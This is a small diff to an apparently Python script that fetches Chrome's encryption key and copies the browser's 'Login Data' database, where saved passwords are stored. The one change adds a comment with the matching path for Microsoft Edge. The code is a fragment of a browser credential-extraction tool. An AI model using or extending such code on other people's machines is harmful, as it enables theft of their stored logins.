@@ -62,6 +62,7 @@ def main():
     key = get_encryption_key()
     # local sqlite Chrome database path
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    # Edge : "USERPROFILE", "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"
     # copy the file to another location
     # as the database will be locked if chrome is currently running
     filename = "ChromeData.db"
